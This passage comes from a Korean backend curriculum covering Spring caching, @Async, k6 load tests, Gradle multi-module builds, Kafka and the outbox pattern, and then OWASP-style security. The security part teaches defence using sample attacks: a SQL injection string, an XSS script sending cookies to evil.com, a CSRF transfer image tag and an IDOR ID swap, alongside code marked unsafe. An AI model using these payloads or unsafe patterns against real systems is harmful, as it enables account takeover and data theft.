            ?: throw ApiException(ErrorCode.PRODUCT_NOT_FOUND)
        product.update(request)
        return product.toDto()
        // 메서드 완료 후 캐시 자동 삭제 → 다음 조회 시 DB에서 새로 로드
    }

    // 해당 캐시 전체 삭제 (주의: 트래픽 많으면 DB 스파이크 발생 가능)
    @CacheEvict(value = ["products"], allEntries = true)
    fun rebuildCache() { }
}
```

**@CachePut — 항상 실행하고 캐시도 갱신:**

```kotlin
// 쓰기 후 캐시도 최신으로 유지 (DB 조회 없이 바로 캐시 반영)
@CachePut(value = ["products"], key = "#result.id")
fun createProduct(request: ProductCreateRequest): ProductDto =
    productRepository.save(request.toEntity()).toDto()
```

**캐싱 전략 비교:**

| 전략 | 흐름 | 적합한 상황 |
|---|---|---|
| **Cache-Aside** | 앱이 직접 캐시 확인 → miss 시 DB → 캐시에 저장 | 일반적인 조회 캐싱 (가장 많이 씀) |
| **Write-Through** | 쓰기 시 DB + 캐시 동시 업데이트 | 쓰기 직후 읽기가 바로 필요할 때 |
| **Write-Behind** | 캐시에 먼저 쓰고, 비동기로 DB 반영 | 쓰기 성능이 극도로 중요할 때 (데이터 유실 위험) |
| **Read-Through** | 캐시 라이브러리가 DB 조회 자동 처리 | Spring Cache로 쉽게 구현 가능 |

**Cache Stampede (캐시 폭풍) 방어:**

```kotlin
// 문제: 인기 캐시 만료 순간 수천 요청이 동시에 DB로 몰림
// 해결 1: 분산 락으로 첫 번째 요청만 DB 조회

@Service
class ProductService(
    private val redissonClient: RedissonClient,
    private val productRepository: ProductRepository,
    private val redisTemplate: RedisTemplate<String, ProductDto>,
) {
    fun findById(id: Long): ProductDto {
        val cacheKey = "products:$id"
        redisTemplate.opsForValue().get(cacheKey)?.let { return it }

        // 캐시 miss → 락 획득 시도
        val lock = redissonClient.getLock("lock:$cacheKey")
        lock.lock(3, TimeUnit.SECONDS)
        try {
            // 락 획득 후 다시 캐시 확인 (다른 스레드가 이미 갱신했을 수 있음)
            redisTemplate.opsForValue().get(cacheKey)?.let { return it }

            val product = productRepository.findByIdOrNull(id)
                ?.toDto()
                ?: throw ApiException(ErrorCode.PRODUCT_NOT_FOUND)
            redisTemplate.opsForValue().set(cacheKey, product, 5, TimeUnit.MINUTES)
            return product
        } finally {
            lock.unlock()
        }
    }
}

// 해결 2: TTL에 랜덤 지터 추가 (동시 만료 방지)
val ttl = Duration.ofMinutes(5).plusSeconds(Random.nextLong(60))
redisTemplate.opsForValue().set(cacheKey, product, ttl)
```

**TTL 설계 원칙:**

| 데이터 특성 | TTL |
|---|---|
| 거의 안 바뀜 (상품 카테고리, 코드 목록) | 1시간 ~ 24시간 |
| 가끔 바뀜 (상품 정보) | 5분 ~ 30분 |
| 자주 바뀜 (재고, 가격) | 30초 ~ 2분 또는 캐싱 X |
| 개인화 데이터 (장바구니, 세션) | 30분 ~ 2시간 (슬라이딩) |

**캐시 무효화는 어렵다:**
> "컴퓨터 과학의 두 가지 어려운 문제: 캐시 무효화, 이름 짓기, off-by-one 에러"

- 캐시 키 설계를 변경 범위와 일치시킬 것 (너무 넓으면 불필요한 무효화)
- Write 경로에 반드시 @CacheEvict 붙이는 것 잊지 말 것
- 캐시 히트율 모니터링: `cache.gets{result="hit"}` / `cache.gets` 비율

---

### 8-B. @Async 비동기 처리

**왜 @Async인가:**

```kotlin
// 동기: 이메일 발송이 끝날 때까지 API 응답 대기 (1~3초 지연)
fun signup(request: SignupRequest): TokenResponse {
    val user = userRepository.save(request.toEntity())
    emailService.sendWelcomeEmail(user.email)   // 3초 블로킹
    return generateToken(user)
}

// 비동기: 이메일 발송은 별도 스레드에서, API는 즉시 응답
fun signup(request: SignupRequest): TokenResponse {
    val user = userRepository.save(request.toEntity())
    emailService.sendWelcomeEmailAsync(user.email)   // 즉시 반환
    return generateToken(user)
}
```

**설정:**

```kotlin
@Configuration
@EnableAsync
class AsyncConfig {

    @Bean("emailExecutor")
    fun emailExecutor(): Executor = ThreadPoolTaskExecutor().apply {
        corePoolSize = 5        // 기본 스레드 수
        maxPoolSize = 20        // 최대 스레드 수
        queueCapacity = 100     // 대기 큐 크기
        setThreadNamePrefix("email-")
        setRejectedExecutionHandler(ThreadPoolExecutor.CallerRunsPolicy())
        // CallerRunsPolicy: 큐가 꽉 차면 호출 스레드가 직접 실행 (요청 유실 방지)
        initialize()
    }

    @Bean("notificationExecutor")
    fun notificationExecutor(): Executor = ThreadPoolTaskExecutor().apply {
        corePoolSize = 3
        maxPoolSize = 10
        queueCapacity = 500
        setThreadNamePrefix("notification-")
        initialize()
    }
}
```

**사용:**

```kotlin
@Service
class EmailService {

    @Async("emailExecutor")   // emailExecutor 스레드풀 사용
    fun sendWelcomeEmail(email: String) {
        log.info("웰컴 이메일 발송: {}", email)
        // SMTP 발송 (1~3초 소요)
        smtpClient.send(email, "환영합니다!", buildWelcomeTemplate(email))
    }

    // 결과가 필요할 때: CompletableFuture 반환
    @Async("emailExecutor")
    fun sendAndGetResult(email: String): CompletableFuture<Boolean> =
        CompletableFuture.completedFuture(
            runCatching { smtpClient.send(email, "제목", "내용") }.isSuccess
        )
}

// 결과 수집 (병렬 실행 후 모두 완료 대기)
val results = emails.map { emailService.sendAndGetResult(it) }
CompletableFuture.allOf(*results.toTypedArray()).join()
```

**@Async 주의사항:**

```kotlin
// ❌ 같은 클래스 내부 호출 — AOP 프록시 우회로 @Async 무시됨
@Service
class OrderService {
    fun placeOrder(request: OrderRequest) {
        processOrder(request)
        sendNotification(request.userId)   // @Async 적용 안 됨!
    }

    @Async
    fun sendNotification(userId: Long) { ... }
}

// ✅ 별도 Bean으로 분리
@Service
class OrderService(
    private val notificationService: NotificationService,  // 별도 Bean
) {
    fun placeOrder(request: OrderRequest) {
        processOrder(request)
        notificationService.sendAsync(request.userId)   // @Async 정상 작동
    }
}

// ❌ @Transactional + @Async 같이 쓰면 트랜잭션 컨텍스트 공유 안 됨
// @Async는 새 스레드 → 새 트랜잭션 컨텍스트 → 부모 트랜잭션과 무관
```

---

### 8-C. 부하 테스트 (k6)

**왜 부하 테스트인가:**
- 단위/통합 테스트는 기능 정확성 검증
- 부하 테스트는 성능 한계와 병목 위치 발견
- 배포 전에 "이 서비스가 초당 몇 요청을 처리할 수 있는가" 확인

**k6 기본 스크립트:**

```javascript
// load-test.js
import http from 'k6/http';
import { check, sleep } from 'k6';
import { Rate } from 'k6/metrics';

const errorRate = new Rate('errors');

export const options = {
    stages: [
        { duration: '30s', target: 10  },   // 30초 동안 10 VU로 증가
        { duration: '1m',  target: 50  },   // 1분 동안 50 VU 유지 (부하)
        { duration: '30s', target: 100 },   // 30초 동안 100 VU로 급증 (스트레스)
        { duration: '30s', target: 0   },   // 30초 동안 0으로 감소 (복구)
    ],
    thresholds: {
        http_req_duration: ['p(99)<1000'],   // P99 응답시간 1초 이하
        errors: ['rate<0.01'],               // 에러율 1% 미만
    },
};

export default function () {
    const res = http.get('http://localhost:8080/api/v1/products/1', {
        headers: { Authorization: `Bearer ${__ENV.TOKEN}` },
    });

    check(res, {
        'status is 200': (r) => r.status === 200,
        'response time < 500ms': (r) => r.timings.duration < 500,
    });

    errorRate.add(res.status !== 200);
    sleep(1);
}
```

```bash
# 실행
k6 run load-test.js

# 결과 예시
scenarios: (100.00%) 1 scenario, 100 max VUs
default: Up to 100 looping VUs for 2m30s

✓ status is 200
✓ response time < 500ms

checks.........................: 98.50%
http_req_duration..............: avg=234ms min=12ms med=198ms max=3.2s p(90)=512ms p(99)=987ms
http_reqs......................: 4523   30.15/s
```

**부하 테스트 시나리오 종류:**

| 시나리오 | 목적 | 설정 |
|---|---|---|
| **Smoke Test** | 기본 동작 확인 | VU 1~5, 짧은 시간 |
| **Load Test** | 예상 트래픽에서 정상 동작 | 목표 VU 유지 |
| **Stress Test** | 한계 용량 파악 | VU를 점진적으로 최대까지 |
| **Spike Test** | 갑작스러운 급증 대응 | VU를 순간적으로 10배 |
| **Soak Test** | 장시간 메모리 누수 감지 | 보통 VU로 수 시간 유지 |

**병목 분석 흐름:**

```
k6 결과에서 P99 응답시간 높음
        │
        ├─ CPU 높음? → 연산 최적화, 스레드풀 크기 조정
        ├─ 메모리 높음? → GC 튜닝, 객체 생성 최소화
        ├─ DB 커넥션 대기? → 풀 크기 증가 또는 쿼리 최적화
        └─ 특정 API만 느림? → EXPLAIN으로 쿼리 분석, 캐싱 도입
```

---

## Phase 9: Gradle 멀티모듈

> 하나의 레포에서 여러 서비스를 독립적으로 배포하는 구조.  
> `test-drive-portal-api`처럼 partner/admin/client를 각각 다른 Pod로 띄울 때 사용한다.

### 9-A. 왜 멀티모듈인가

**단일 모듈의 문제:**

```
monolith-api/
└── src/
    ├── customer/      ← 고객 API
    ├── admin/         ← 관리자 API
    └── partner/       ← 파트너 API

문제:
- customer 코드 변경 → admin/partner까지 전부 재배포
- admin이 실수로 customer 내부 코드 직접 접근 가능
- 세 서비스를 각각 다른 스펙(메모리, CPU)의 Pod로 띄우기 어려움
```

**멀티모듈 해결:**

```
my-platform/
├── :domain          ← 공통 도메인 (Entity, Repository Interface)
├── :common          ← 공통 유틸, 예외, DTO
├── :api-customer    ← 고객 전용 Spring Boot App  → customer Pod
├── :api-admin       ← 관리자 전용 Spring Boot App → admin Pod
└── :api-partner     ← 파트너 전용 Spring Boot App → partner Pod

- api-customer는 :domain, :common만 의존 → admin 코드 접근 불가
- 각 모듈을 독립적으로 빌드/배포
- :domain 변경만 전체에 영향, :api-customer 변경은 customer만 재배포
```

---

### 9-B. 프로젝트 구조 설계

```
my-platform/
├── settings.gradle.kts          ← 모듈 목록 선언
├── build.gradle.kts             ← 루트 공통 설정
├── gradle/
│   └── libs.versions.toml       ← 전체 의존성 버전 통합 관리
│
├── domain/                      ← 순수 도메인 (Spring 의존성 최소화)
│   ├── build.gradle.kts
│   └── src/
│       └── main/kotlin/
│           ├── order/Order.kt
│           ├── user/User.kt
│           └── product/Product.kt
│
├── common/                      ← 공통 유틸, 예외, 응답 포맷
│   ├── build.gradle.kts
│   └── src/main/kotlin/
│       ├── exception/ApiException.kt
│       ├── exception/ErrorCode.kt
│       └── response/ApiResponse.kt
│
├── api-customer/                ← 고객 API 애플리케이션
│   ├── build.gradle.kts
│   ├── Dockerfile
│   └── src/main/kotlin/
│       └── CustomerApplication.kt
│
├── api-admin/                   ← 관리자 API 애플리케이션
│   ├── build.gradle.kts
│   ├── Dockerfile
│   └── src/main/kotlin/
│       └── AdminApplication.kt
│
└── api-partner/                 ← 파트너 API 애플리케이션
    ├── build.gradle.kts
    ├── Dockerfile
    └── src/main/kotlin/
        └── PartnerApplication.kt
```

---

### 9-C. Gradle 설정

**settings.gradle.kts — 모듈 등록:**

```kotlin
rootProject.name = "my-platform"

include(
    ":domain",
    ":common",
    ":api-customer",
    ":api-admin",
    ":api-partner",
)
```

**루트 build.gradle.kts — 공통 설정:**

```kotlin
plugins {
    kotlin("jvm") version "2.1.0" apply false
    kotlin("plugin.spring") version "2.1.0" apply false
    id("org.springframework.boot") version "3.3.0" apply false
    id("io.spring.dependency-management") version "1.1.5" apply false
}

// 모든 서브모듈에 공통 적용
subprojects {
    apply(plugin = "org.jetbrains.kotlin.jvm")

    repositories {
        mavenCentral()
    }

    // 모든 모듈 공통 의존성
    dependencies {
        "implementation"("org.jetbrains.kotlin:kotlin-stdlib")
        "testImplementation"("io.kotest:kotest-runner-junit5:5.8.1")
        "testImplementation"("io.kotest:kotest-assertions-core:5.8.1")
    }

    tasks.withType<Test> { useJUnitPlatform() }
    tasks.withType<org.jetbrains.kotlin.gradle.tasks.KotlinCompile> {
        compilerOptions { jvmTarget.set(org.jetbrains.kotlin.gradle.dsl.JvmTarget.JVM_21) }
    }
}

// Spring Boot 모듈에만 Spring 플러그인 적용
configure(subprojects.filter { it.name.startsWith("api-") }) {
    apply(plugin = "org.jetbrains.kotlin.plugin.spring")
    apply(plugin = "org.springframework.boot")
    apply(plugin = "io.spring.dependency-management")
}
```

**:domain/build.gradle.kts — Spring 의존성 최소화:**

```kotlin
// Spring Boot 플러그인 없음 — 순수 Kotlin 라이브러리
dependencies {
    // JPA 어노테이션만 필요 (Spring Boot 불필요)
    implementation("jakarta.persistence:jakarta.persistence-api")
    implementation("org.springframework.data:spring-data-commons")
}
```

**:common/build.gradle.kts:**

```kotlin
dependencies {
    implementation(project(":domain"))
    implementation("org.springframework:spring-web")   // HttpStatus 등
    implementation("com.fasterxml.jackson.module:jackson-module-kotlin")
}
```

**:api-customer/build.gradle.kts:**

```kotlin
dependencies {
    implementation(project(":domain"))
    implementation(project(":common"))

    implementation("org.springframework.boot:spring-boot-starter-web")
    implementation("org.springframework.boot:spring-boot-starter-data-jpa")
    implementation("org.springframework.boot:spring-boot-starter-security")
    implementation("org.springframework.boot:spring-boot-starter-data-redis")

    runtimeOnly("com.mysql:mysql-connector-j")

    testImplementation("org.springframework.boot:spring-boot-starter-test")
    testImplementation("org.testcontainers:mariadb")
}
```

---

### 9-D. 모듈 의존성 규칙

```
의존성 방향 (단방향, 역방향 금지):

:domain          ← 의존성 없음 (순수)
:common          ← :domain
:api-customer    ← :domain, :common
:api-admin       ← :domain, :common
:api-partner     ← :domain, :common

금지:
:domain → :common       ← 역방향
:api-customer → :api-admin  ← 횡방향 (audience 간 직접 접근)
```

**의존성 순환 방지 — Gradle이 감지:**

```bash
# 순환 의존성 있으면 빌드 실패
# A → B → A 형태 감지 시:
# > Circular dependency between the following tasks:
```

---

### 9-E. 독립 빌드 & 배포

**모듈별 독립 빌드:**

```bash
# 전체 빌드
./gradlew build

# 특정 모듈만 빌드 (customer만 변경됐을 때)
./gradlew :api-customer:build

# 특정 모듈 테스트
./gradlew :api-customer:test

# 특정 모듈 bootJar (배포용 JAR)
./gradlew :api-customer:bootJar
# → api-customer/build/libs/api-customer-1.0.0.jar
```

**모듈별 Dockerfile:**

```dockerfile
# api-customer/Dockerfile
FROM eclipse-temurin:21-jdk AS builder
WORKDIR /app
COPY gradlew build.gradle.kts settings.gradle.kts ./
COPY gradle ./gradle
COPY domain ./domain
COPY common ./common
COPY api-customer ./api-customer
RUN ./gradlew :api-customer:bootJar --no-daemon -x test

FROM eclipse-temurin:21-jre
COPY --from=builder /app/api-customer/build/libs/*.jar app.jar
ENTRYPOINT ["java", "-jar", "app.jar"]
```

**GitHub Actions — 변경된 모듈만 빌드:**

```yaml
# .github/workflows/ci.yml
jobs:
  detect-changes:
    outputs:
      customer: ${{ steps.filter.outputs.customer }}
      admin: ${{ steps.filter.outputs.admin }}
      partner: ${{ steps.filter.outputs.partner }}
    steps:
      - uses: dorny/paths-filter@v3
        id: filter
        with:
          filters: |
            customer:
              - 'api-customer/**'
              - 'domain/**'
              - 'common/**'
            admin:
              - 'api-admin/**'
              - 'domain/**'
              - 'common/**'
            partner:
              - 'api-partner/**'
              - 'domain/**'
              - 'common/**'

  deploy-customer:
    needs: detect-changes
    if: needs.detect-changes.outputs.customer == 'true'
    steps:
      - run: ./gradlew :api-customer:bootJar
      - run: docker build -f api-customer/Dockerfile -t customer:${{ github.sha }} .
      # kubectl set image deployment/customer ...
```

---

### 9-F. 실제 프로젝트 적용 판단 기준

**멀티모듈이 적합한 경우:**
- audience별로 배포 주기나 스케일이 다름 (customer는 트래픽 많고 admin은 적음)
- 팀이 나뉘어 각자 담당 모듈을 독립적으로 개발
- 모듈 간 코드 접근 경계를 Gradle이 강제하길 원함

**단일 모듈로도 충분한 경우:**
- 팀이 작고 (1~3명) 배포 주기가 동일
- audience 간 코드 공유가 많아 분리 이득이 적음
- `test-drive-portal-api`처럼 패키지 분리로 논리적 경계가 이미 잘 관리됨

> **현재 test-drive-portal-api의 선택:** 단일 모듈 + 패키지 분리  
> 이 구조도 충분히 유효하다. 팀 규모와 배포 복잡도가 커질 때 멀티모듈 전환을 고려한다.

---

## Phase 10: 메시지 큐 / 이벤트 기반 아키텍처

> 서비스 간 직접 호출은 한쪽이 죽으면 다른 쪽도 영향받는다.  
> 메시지 큐는 이 강결합을 끊는다. 현대 백엔드에서 사실상 필수 도구다.

### 10-A. 왜 메시지 큐인가

**동기 통신의 문제:**

```
주문 서비스 → 재고 서비스 (HTTP)
           → 알림 서비스 (HTTP)
           → 포인트 서비스 (HTTP)

문제:
- 재고 서비스가 느리면 → 주문 응답도 느려짐
- 알림 서비스가 죽으면 → 주문 자체가 실패할 수 있음
- 새 서비스 추가마다 → 주문 서비스 코드 수정 필요
```

**메시지 큐로 해결:**

```
주문 서비스 → [order.created 이벤트] → Kafka
                                          ├─ 재고 서비스 (구독)
                                          ├─ 알림 서비스 (구독)
                                          └─ 포인트 서비스 (구독)

장점:
- 주문 서비스는 이벤트만 발행, 누가 구독하는지 모름 (느슨한 결합)
- 알림 서비스가 죽어도 주문 성공 (이벤트는 큐에 쌓임)
- 새 서비스 추가해도 주문 서비스 코드 변경 없음
```

**Kafka vs RabbitMQ:**

| | Kafka | RabbitMQ |
|---|---|---|
| 모델 | Pull (Consumer가 당겨감) | Push (Broker가 밀어줌) |
| 메시지 보존 | 설정한 기간 유지 (재처리 가능) | 소비 후 삭제 |
| 처리량 | 매우 높음 (수백만/초) | 중간 (수만/초) |
| 적합한 상황 | 대용량 이벤트 스트림, 로그 수집 | 작업 큐, 복잡한 라우팅 |
| 학습 난이도 | 높음 | 낮음 |

> 국내 스타트업/중견 기업 대부분은 **Kafka**. 이 커리큘럼도 Kafka 기준.

---

### 10-B. Kafka 핵심 개념

```
Producer → [Topic: order.created] → Consumer Group
                   │
              Partition 0  ─ Consumer A (Group: inventory)
              Partition 1  ─ Consumer B (Group: inventory)
              Partition 2  ─ Consumer C (Group: inventory)
                              Consumer D (Group: notification)  ← 같은 토픽 다른 그룹
```

**Topic / Partition / Offset:**

```
Topic: 메시지 분류 단위 (order.created, payment.completed 등)
Partition: Topic을 나눈 물리적 단위 → 병렬 처리 가능
Offset: Partition 내 메시지 순번 → Consumer가 어디까지 읽었는지 추적

│ Partition 0 │ msg0 │ msg1 │ msg2 │ msg3 │ ...
│             offset→  0      1      2      3
                                    ↑
                              Consumer 현재 위치
```

**Consumer Group:**
- 같은 그룹 내 Consumer들은 파티션을 나눠서 처리 (수평 확장)
- 다른 그룹은 같은 메시지를 독립적으로 소비 (서비스 간 독립)
- Pod가 3개면 Consumer도 3개 → Partition도 3개 이상 필요

---

### 10-C. Spring Kafka 설정

**의존성:**

```kotlin
// build.gradle.kts
implementation("org.springframework.kafka:spring-kafka")

// application.yml
spring:
  kafka:
    bootstrap-servers: ${KAFKA_SERVERS:localhost:9092}
    producer:
      key-serializer: org.apache.kafka.common.serialization.StringSerializer
      value-serializer: org.springframework.kafka.support.serializer.JsonSerializer
      acks: all          # 모든 replica 확인 후 ack → 유실 방지
      retries: 3
    consumer:
      group-id: ${spring.application.name}
      key-deserializer: org.apache.kafka.common.serialization.StringDeserializer
      value-deserializer: org.springframework.kafka.support.serializer.JsonDeserializer
      auto-offset-reset: earliest   # 새 그룹은 처음부터 읽음
      enable-auto-commit: false     # 수동 커밋 (처리 완료 후 커밋)
      properties:
        spring.json.trusted.packages: "kr.socar.*"
```

**이벤트 정의:**

```kotlin
// 이벤트는 불변 데이터 클래스로
data class OrderCreatedEvent(
    val orderId: Long,
    val userId: Long,
    val productId: Long,
    val amount: Int,
    val occurredAt: LocalDateTime = LocalDateTime.now(),
)
```

**Producer — 이벤트 발행:**

```kotlin
@Component
class OrderEventPublisher(
    private val kafkaTemplate: KafkaTemplate<String, Any>,
) {
    fun publishOrderCreated(event: OrderCreatedEvent) {
        kafkaTemplate.send(
            "order.created",
            event.orderId.toString(),   // 파티션 키: 같은 주문은 같은 파티션으로
            event,
        ).whenComplete { result, ex ->
            if (ex != null) {
                log.error("이벤트 발행 실패: orderId={}", event.orderId, ex)
            } else {
                log.info("이벤트 발행 성공: orderId={}, partition={}, offset={}",
                    event.orderId,
                    result.recordMetadata.partition(),
                    result.recordMetadata.offset(),
                )
            }
        }
    }
}
```

**Consumer — 이벤트 구독:**

```kotlin
@Component
class InventoryEventConsumer {

    @KafkaListener(
        topics = ["order.created"],
        groupId = "inventory-service",
        containerFactory = "kafkaListenerContainerFactory",
    )
    fun handleOrderCreated(
        event: OrderCreatedEvent,
        acknowledgment: Acknowledgment,   // 수동 커밋용
    ) {
        try {
            inventoryService.decreaseStock(event.productId, 1)
            acknowledgment.acknowledge()   // 성공 시에만 커밋
        } catch (e: Exception) {
            log.error("재고 감소 실패: orderId={}", event.orderId, e)
            throw e   // 재시도 트리거 (nack)
        }
    }
}
```

**에러 처리 — Dead Letter Topic (DLT):**

```kotlin
@Configuration
class KafkaConfig {

    @Bean
    fun kafkaListenerContainerFactory(
        consumerFactory: ConsumerFactory<String, Any>,
        kafkaTemplate: KafkaTemplate<String, Any>,
    ): ConcurrentKafkaListenerContainerFactory<String, Any> {
        val factory = ConcurrentKafkaListenerContainerFactory<String, Any>()
        factory.consumerFactory = consumerFactory
        factory.containerProperties.ackMode = ContainerProperties.AckMode.MANUAL

        // 3번 재시도 후 실패하면 DLT(order.created.DLT)로 이동
        factory.setCommonErrorHandler(
            DefaultErrorHandler(
                DeadLetterPublishingRecoverer(kafkaTemplate),
                FixedBackOff(1000L, 3),   // 1초 간격, 3회 재시도
            )
        )
        return factory
    }
}

// DLT 소비자 — 실패한 메시지 별도 처리
@KafkaListener(topics = ["order.created.DLT"], groupId = "inventory-dlt")
fun handleDlt(event: OrderCreatedEvent) {
    log.error("DLT 메시지 수신: {}", event)
    alertService.notify("재고 처리 최종 실패: orderId=${event.orderId}")
}
```

---

### 10-D. 전달 보장 수준

| 수준 | 설명 | 문제 | 해결 |
|---|---|---|---|
| **At Most Once** | 최대 한 번 (유실 가능) | 메시지 유실 | — |
| **At Least Once** | 최소 한 번 (중복 가능) | 중복 처리 | **멱등성 Consumer** |
| **Exactly Once** | 정확히 한 번 | 복잡한 구현 | Kafka 트랜잭션 |

**실무 권장: At Least Once + 멱등성 Consumer**

```kotlin
// 멱등성 Consumer: 같은 메시지를 여러 번 받아도 결과가 같아야 함
@KafkaListener(topics = ["order.created"])
fun handleOrderCreated(event: OrderCreatedEvent) {
    // 이미 처리된 이벤트면 무시
    if (processedEventRepository.existsByOrderId(event.orderId)) {
        log.info("중복 이벤트 무시: orderId={}", event.orderId)
        return
    }

    inventoryService.decreaseStock(event.productId, 1)

    // 처리 완료 기록
    processedEventRepository.save(ProcessedEvent(orderId = event.orderId))
}
```

---

### 10-E. Transactional Outbox Pattern

**문제 — DB 저장과 이벤트 발행의 원자성:**

```kotlin
// ❌ 위험한 패턴: DB 저장 성공 후 Kafka 발행 실패하면 이벤트 유실
@Transactional
fun placeOrder(request: OrderRequest): OrderDto {
    val order = orderRepository.save(request.toEntity())
    kafkaTemplate.send("order.created", OrderCreatedEvent(order.id))  // 여기서 실패하면?
    return order.toDto()
}
```

**해결 — Outbox 테이블:**

```sql
-- Flyway 마이그레이션
CREATE TABLE outbox_events (
    id          BIGINT       NOT NULL AUTO_INCREMENT,
    event_type  VARCHAR(100) NOT NULL,
    payload     JSON         NOT NULL,
    published   BOOLEAN      NOT NULL DEFAULT FALSE,
    created_at  DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP,
    PRIMARY KEY (id),
    INDEX idx_outbox_unpublished (published, created_at)
);
```

```kotlin
// ✅ Outbox 패턴: DB 트랜잭션 안에 이벤트 저장
@Transactional
fun placeOrder(request: OrderRequest): OrderDto {
    val order = orderRepository.save(request.toEntity())

    // Kafka가 아닌 DB에 저장 → 같은 트랜잭션으로 원자성 보장
    outboxRepository.save(OutboxEvent(
        eventType = "order.created",
        payload = objectMapper.writeValueAsString(OrderCreatedEvent(order.id, ...)),
    ))

    return order.toDto()
}

// 별도 스케줄러: outbox 테이블을 폴링해서 Kafka에 발행
@Scheduled(fixedDelay = 1000)
@Transactional
fun publishPendingEvents() {
    outboxRepository.findByPublishedFalseOrderByCreatedAtAsc()
        .forEach { event ->
            kafkaTemplate.send(event.eventType, event.payload)
            event.markPublished()
        }
}
```

---

## Phase 11: 보안 심화

> 보안은 기능이 아니라 습관이다.  
> 코드 리뷰할 때 이 목록을 떠올릴 수 있으면 시니어다.

### 11-A. OWASP Top 10 개요

| 순위 | 취약점 | 핵심 방어 |
|---|---|---|
| A01 | Broken Access Control | 모든 요청에 권한 검증 |
| A02 | Cryptographic Failures | 민감 정보 암호화, HTTPS 강제 |
| A03 | **Injection** (SQL, LDAP 등) | PreparedStatement, ORM |
| A04 | Insecure Design | 위협 모델링 |
| A05 | Security Misconfiguration | 기본값 변경, 불필요한 기능 비활성화 |
| A06 | Vulnerable Components | 의존성 취약점 스캔 |
| A07 | **Auth Failures** | MFA, 안전한 세션 관리 |
| A08 | Data Integrity Failures | 서명 검증, Outbox 패턴 |
| A09 | Logging Failures | 보안 이벤트 로깅 |
| A10 | **SSRF** | 외부 URL 요청 검증 |

---

### 11-B. SQL Injection

**공격 원리:**

```sql
-- 취약한 코드: 문자열 직접 연결
val query = "SELECT * FROM users WHERE email = '$email' AND password = '$password'"

-- 공격자 입력: email = "' OR '1'='1"
-- 결과 쿼리:
SELECT * FROM users WHERE email = '' OR '1'='1' AND password = '...'
-- → 모든 사용자 조회됨, 비밀번호 없이 로그인 가능
```

**방어 — Spring에서는 기본적으로 안전:**

```kotlin
// ✅ JPA — 파라미터 바인딩 자동 처리
interface UserRepository : JpaRepository<User, Long> {
    fun findByEmail(email: String): User?   // PreparedStatement 사용
}

// ✅ QueryDSL — 컴파일 타임 타입 안전
queryFactory.selectFrom(user)
    .where(user.email.eq(email))   // 자동 파라미터 바인딩

// ❌ 위험: Native Query에 문자열 직접 삽입
@Query(value = "SELECT * FROM users WHERE email = '${email}'", nativeQuery = true)
fun findByEmailUnsafe(email: String): User?

// ✅ 안전: Named parameter 사용
@Query(value = "SELECT * FROM users WHERE email = :email", nativeQuery = true)
fun findByEmailSafe(@Param("email") email: String): User?
```

---

### 11-C. XSS (Cross-Site Scripting)

**공격 원리:**

```javascript
// 공격자가 게시글 내용에 스크립트 삽입
content = "<script>document.location='https://evil.com?cookie='+document.cookie</script>"

// 피해자가 게시글 조회 시 스크립트 실행 → 쿠키 탈취
```

**방어:**

```kotlin
// 1. API 서버: HTML 반환하지 않음 (JSON만) → XSS 위험 낮음
// 2. 프론트엔드에서 출력 인코딩 (React는 기본 처리)

// 3. Content-Security-Policy 헤더 설정
@Configuration
class SecurityHeadersConfig : WebMvcConfigurer {
    override fun addCorsMappings(registry: CorsRegistry) {
        registry.addMapping("/api/**")
            .allowedOrigins("https://myapp.com")   // 허용 출처 명시
    }
}

// Spring Security에서 보안 헤더 추가
http.headers { headers ->
    headers.contentSecurityPolicy { csp ->
        csp.policyDirectives("default-src 'self'; script-src 'self'")
    }
    headers.frameOptions { it.deny() }   // Clickjacking 방지
    headers.xssProtection { }
}

// 4. DB 저장 시 HTML 태그 제거 (사용자 입력을 HTML로 렌더링할 경우)
implementation("org.owasp.antisamy:antisamy:1.7.5")

fun sanitize(input: String): String =
    AntiSamy().scan(input, policy).cleanHTML
```

---

### 11-D. CSRF (Cross-Site Request Forgery)

**공격 원리:**

```html
<!-- 악성 사이트에 심어둔 코드 -->
<!-- 피해자가 은행 사이트에 로그인된 상태에서 이 페이지를 방문하면 -->
<img src="https://bank.com/transfer?to=attacker&amount=1000000">
<!-- 브라우저가 쿠키를 자동으로 전송 → 피해자 모르게 송금 -->
```

**방어:**

```kotlin
// 1. JWT (Bearer Token) 사용 시 CSRF 거의 불필요
// → 쿠키가 아닌 헤더(Authorization)로 전송 → 자동 전송 없음
http.csrf { it.disable() }   // JWT API 서버에서는 비활성화 일반적

// 2. 쿠키 기반 인증 시: SameSite 쿠키 설정
@Bean
fun cookieSerializer(): CookieSerializer =
    DefaultCookieSerializer().apply {
        setSameSite("Strict")   // 동일 사이트 요청만 쿠키 전송
        setUseSecureCookie(true)   // HTTPS에서만 쿠키 전송
        setUseHttpOnlyCookie(true)   // JS에서 쿠키 접근 불가 → XSS 방어
    }

// 3. 중요 작업에 CSRF 토큰 검증 (쿠키 기반 세션 사용 시)
http.csrf { csrf ->
    csrf.csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
}
```

---

### 11-E. IDOR (Insecure Direct Object Reference)

**공격 원리:**

```
GET /api/v1/orders/12345   ← 내 주문
GET /api/v1/orders/12346   ← 다른 사람 주문 (ID만 바꿔서 접근 시도)
```

**방어 — 모든 리소스 접근에 소유권 검증:**

```kotlin
@GetMapping("/v1/orders/{orderId}")
fun getOrder(
    @PathVariable orderId: Long,
    @AuthenticationPrincipal currentUser: User,
): OrderDto {
    val order = orderRepository.findByIdOrNull(orderId)
        ?: throw ApiException(ErrorCode.ORDER_NOT_FOUND)

    // ✅ 항상 소유권 확인
    if (order.userId != currentUser.id) {
        throw ApiException(ErrorCode.FORBIDDEN)   // 403, 존재 여부도 노출하지 않으려면 404
    }

    return order.toDto()
}

// 더 나은 방법: Repository에서 소유권 포함해 조회
@Query("SELECT o FROM Order o WHERE o.id = :id AND o.userId = :userId")
fun findByIdAndUserId(id: Long, userId: Long): Order?

// Service
fun getOrder(orderId: Long, currentUserId: Long): OrderDto =
    orderRepository.findByIdAndUserId(orderId, currentUserId)
        ?.toDto()
        ?: throw ApiException(ErrorCode.ORDER_NOT_FOUND)   // 존재 여부 노출 없이 404
```

---

### 11-F. 추가 보안 체크리스트

**민감 정보 관리:**

```kotlin
// ❌ 절대 금지: 소스 코드에 하드코딩
val jwtSecret = "my-secret-key-1234"

// ✅ 환경 변수로 주입
val jwtSecret = System.getenv("JWT_SECRET")
    ?: throw IllegalStateException("JWT_SECRET 환경 변수 필요")

// ❌ 비밀번호 평문 저장
user.password = request.password

